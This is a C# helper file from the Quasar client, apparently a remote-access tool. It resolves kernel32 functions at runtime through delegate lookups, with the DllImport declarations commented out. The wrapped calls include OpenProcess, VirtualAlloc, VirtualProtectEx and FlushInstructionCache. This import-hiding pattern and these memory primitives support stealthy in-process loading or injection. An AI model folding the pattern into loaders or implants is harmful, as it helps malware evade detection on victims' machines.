using Quasar.Client.Win32PE.Structs;
using System;
using System.Globalization;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Text;

namespace Quasar.Client.Utilities
{
    internal static partial class ClientNatives
    {
        private const int FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
        private static readonly StringBuilder m_sbSysMsg = new StringBuilder(1024);

        public const int MAX_PATH = 260;

        public static string FormatSystemMessage(int dwMessageId)
        {
            lock (m_sbSysMsg)
            {
                var ret = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,
                                        IntPtr.Zero,
                                        dwMessageId,
                                        CultureInfo.CurrentCulture.LCID,
                                        m_sbSysMsg,
                                        m_sbSysMsg.Capacity - 1,
                                        IntPtr.Zero);

                if (ret > 0)
                    return m_sbSysMsg.ToString(0, ret);
                return null;
            }
        }

        // delegates
        //[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate IntPtr LoadLibraryFunc([MarshalAs(UnmanagedType.LPWStr)] string lpFileName);
        internal static IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPWStr)] string lpFileName) => Lookup<LoadLibraryFunc>("kernel32.dll", "LoadLibraryW")(lpFileName);

        //[DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool FreeLibraryFunc(IntPtr hModule);

        internal static bool FreeLibrary(IntPtr hModule) => Lookup<FreeLibraryFunc>("kernel32.dll", "FreeLibrary")(hModule);

        //[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        //internal delegate IntPtr GetProcAddressFunc(IntPtr hModule, string procName);

        //[DllImport("kernel32.dll", SetLastError = true)]
        internal delegate bool QueryFullProcessImageNameFunc([In] IntPtr hProcess, [In] uint dwFlags, [Out] StringBuilder lpExeName, [In, Out] ref uint lpdwSize);
        internal static bool QueryFullProcessImageName(IntPtr hProcess, uint dwFlags, StringBuilder lpExeName, ref uint lpdwSize) => Lookup<QueryFullProcessImageNameFunc>("kernel32.dll", "QueryFullProcessImageName")(hProcess, dwFlags, lpExeName, ref lpdwSize);

        //[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal delegate int FormatMessageProc(int dwFlags,
                                                IntPtr lpSource,
                                                int dwMessageId,
                                                int dwLanguageId,
                                                [Out] StringBuilder lpBuffer,
                                                int nSize,
                                                IntPtr lpArguments);
        internal static int FormatMessage(int dwFlags,
                                                IntPtr lpSource,
                                                int dwMessageId,
                                                int dwLanguageId,
                                                [Out] StringBuilder lpBuffer,
                                                int nSize,
                                                IntPtr lpArguments) => Lookup<FormatMessageProc>("kernel32.dll", "FormatMessage")(dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, lpArguments);

        //[DllImport("kernel32.dll", SetLastError = true)]
        internal delegate IntPtr VirtualAllocProc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        internal static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect)
            => Lookup<VirtualAllocProc>("kernel32.dll", "VirtualAlloc")(lpAddress, dwSize, flAllocationType, flProtect);

        //[DllImport("kernel32")]
        internal delegate bool VirtualFreeProc(IntPtr lpAddress, uint dwSize, uint dwFreeType);
        internal static bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType)
            => Lookup<VirtualFreeProc>("kernel32.dll", "VirtualFree")(lpAddress, dwSize, dwFreeType);

        //[DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool IsWow64ProcessProc([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
        internal static bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo) => Lookup<IsWow64ProcessProc>("kernel32.dll", "IsWow64Process")(hProcess, out lpSystemInfo);

        //[DllImport("kernel32.dll", SetLastError = true)]
        internal delegate int GetThreadIdProc(IntPtr threadHandle);
        internal static int GetThreadId(IntPtr threadHandle) => Lookup<GetThreadIdProc>("kernel32.dll", "GetThreadId")(threadHandle);

        //[DllImport("kernel32.dll")]
        internal delegate uint GetCurrentThreadIdProc();
        internal static uint GetCurrentThreadId() => Lookup<GetCurrentThreadIdProc>("kernel32.dll", "GetCurrentThreadId")();

        //[DllImport("kernel32.dll", SetLastError = true)]
        internal delegate IntPtr OpenProcessProc([In] ProcessAccessRights dwDesiredAccess, [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In] int dwProcessId);
        internal static IntPtr OpenProcess([In] ProcessAccessRights dwDesiredAccess, [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In] int dwProcessId)
            => Lookup<OpenProcessProc>("kernel32.dll", "OpenProcess")(dwDesiredAccess, bInheritHandle, dwProcessId);

        //[DllImport("kernel32.dll", SetLastError = true)]
        internal delegate IntPtr OpenThreadProc([In] ThreadAccessRights dwDesiredAccess, [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In] int dwProcessId);
        internal static IntPtr OpenThread([In] ThreadAccessRights dwDesiredAccess, [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In] int dwProcessId)
            => Lookup<OpenThreadProc>("kernel32.dll", "OpenThread")(dwDesiredAccess, bInheritHandle, dwProcessId);

        //[DllImport("kernel32.dll")]
        internal delegate bool TerminateThread(IntPtr hThread, uint dwExitCode);

        //[DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool DuplicateHandleProc(
            [In] IntPtr hSourceProcessHandle,
            [In] IntPtr hSourceHandle,
            [In] IntPtr hTargetProcessHandle,
            [Out] out IntPtr lpTargetHandle,
            [In] int dwDesiredAccess,
            [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            [In] DuplicateHandleOptions dwOptions);
        internal static bool DuplicateHandle(
            [In] IntPtr hSourceProcessHandle,
            [In] IntPtr hSourceHandle,
            [In] IntPtr hTargetProcessHandle,
            [Out] out IntPtr lpTargetHandle,
            [In] int dwDesiredAccess,
            [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            [In] DuplicateHandleOptions dwOptions) => Lookup<DuplicateHandleProc>("kernel32.dll", "DuplicateHandle")(
                hSourceProcessHandle,
                hSourceHandle,
                hTargetProcessHandle,
                out lpTargetHandle,
                dwDesiredAccess,
                bInheritHandle,
                dwOptions);

        //[DllImport("kernel32.dll")]
        internal delegate IntPtr GetCurrentProcessProc();
        internal static IntPtr GetCurrentProcess() => Lookup<GetCurrentProcessProc>("kernel32.dll", "GetCurrentProcess")();

        //[DllImport("kernel32.dll")]
        internal delegate int GetCurrentProcessIdProc();
        internal static int GetCurrentProcessId() => Lookup<GetCurrentProcessIdProc>("kernel32.dll", "GetCurrentProcessId")();

        //[DllImport("kernel32.dll", SetLastError = true)]
        internal delegate int GetProcessIdProc([In] IntPtr Process);
        internal static int GetProcessId([In] IntPtr Process) => Lookup<GetProcessIdProc>("kernel32.dll", "GetProcessId")(Process);

        //[DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool CloseHandleProc([In] IntPtr hObject);
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        internal static bool CloseHandle([In] IntPtr hObject) => Lookup<CloseHandleProc>("kernel32.dll", "CloseHandle")(hObject);

        //[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal delegate int QueryDosDeviceProc(
            [In] string lpDeviceName,
            [Out] StringBuilder lpTargetPath,
            [In] int ucchMax);
        internal static int QueryDosDevice(
            [In] string lpDeviceName,
            [Out] StringBuilder lpTargetPath,
            [In] int ucchMax) => Lookup<QueryDosDeviceProc>("kernel32.dll", "QueryDosDevice")(lpDeviceName, lpTargetPath, ucchMax);

        //[DllImport("kernel32.dll", SetLastError = true)]

        internal delegate void GetSystemInfoProc(ref SYSTEM_INFO Info);
        internal static void GetSystemInfo(ref SYSTEM_INFO Info) => Lookup<GetSystemInfoProc>("kernel32.dll", "GetSystemInfo")(ref Info);

        //[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        internal delegate void OutputDebugStringProc(string lpOutputString);
        internal static void OutputDebugString(string lpOutputString) => Lookup<OutputDebugStringProc>("kernel32.dll", "OutputDebugString")(lpOutputString);

        //[DllImport("kernel32.dll")]
        internal delegate bool VirtualProtectExProc(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, PageAccessRights flNewProtect, out PageAccessRights lpflOldProtect);
        internal static bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, PageAccessRights flNewProtect, out PageAccessRights lpflOldProtect)
            => Lookup<VirtualProtectExProc>("kernel32.dll", "VirtualProtectEx")(hProcess, lpAddress, dwSize, flNewProtect, out lpflOldProtect);

        //[DllImport("kernel32.dll")]
        internal delegate bool FlushInstructionCacheProc(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
        internal static bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize)
            => Lookup<FlushInstructionCacheProc>("kernel32.dll", "FlushInstructionCache")(hProcess, lpBaseAddress, dwSize);
    }
}
